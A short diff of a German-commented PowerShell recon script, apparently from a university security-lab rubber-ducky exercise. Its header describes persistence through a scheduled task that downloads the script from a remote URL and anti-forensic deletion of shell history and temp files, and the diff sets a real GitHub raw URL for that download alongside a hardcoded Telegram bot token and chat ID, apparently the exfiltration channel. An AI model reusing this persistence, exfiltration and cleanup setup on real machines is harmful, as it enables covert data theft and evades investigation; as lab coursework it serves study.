@@ -9,12 +9,12 @@
 #    3. Persist  – Scheduled Task lädt dieses Script von Gist
 #    4. OPSEC   – PS-History, Temp, Recent Files löschen
 #
-#  Setup: PERSIST_GIST_RAW_URL = Raw-URL dieses Scripts auf Gist
+#  Persist: Scheduled Task lädt dieses Script von GitHub
 # ============================================================
 
 $BOT_TOKEN            = "8666929583:AAHXKuc4gV1n6JMYQeoPxw3uby08GVivvgo"
 $CHAT_ID              = "1780237079"
-$PERSIST_GIST_RAW_URL = "GIST_RAW_URL"   # Raw-URL dieses Scripts für Scheduled Task
+$PERSIST_GIST_RAW_URL = "https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/developer_recon.ps1"
 
 # ── Hilfsfunktionen ─────────────────────────────────────────
 
